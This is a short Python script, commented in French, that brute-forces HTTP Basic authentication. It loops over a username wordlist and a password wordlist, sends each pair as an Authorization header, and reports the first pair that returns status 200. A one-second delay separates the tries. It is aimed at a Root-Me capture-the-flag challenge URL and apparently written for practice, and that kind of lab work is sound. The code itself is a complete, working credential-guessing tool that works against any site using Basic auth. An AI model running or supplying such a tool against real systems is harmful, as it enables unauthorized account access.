"""
Script pour bruteforce une authentication basique HTTP
TODO:
-Rajouter une barre de chargement

"""
import requests, base64, time

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",

}


def creds_is_valid(url, login, password):
    b64cred = base64.b64encode("{}:{}".format(login, password).encode()).decode()
    headers["Authorization"] = "Basic {}".format(b64cred)
    r = requests.get(url, headers=headers)
    if r.status_code == 200:
        return True
    else:
        return False


def bruteforce_basic_auth(url, user_wordlist, password_wordlist, tempo):
    with open(user_wordlist, 'r') as userFile:
        user_list = [x.strip() for x in userFile.readlines()]

    with open(password_wordlist, 'r') as passFile:
        pass_list = [x.strip() for x in passFile.readlines()]

    for user in user_list:
        for password in pass_list:
            if creds_is_valid(url, user, password):
                return "{}:{}".format(user, password)
                break
            time.sleep(tempo)
    return "Not Found!"


if __name__ == "__main__":
    url = "http://challenge01.root-me.org/web-serveur/ch3/"
    #login = "admin"
    #password = "admin"
    #print(creds_is_valid(url, login, password))
    print(bruteforce_basic_auth(url,'/home/lab/Bureau/tmp/test_user.txt','/home/lab/Bureau/tmp/test_pass.txt',1))
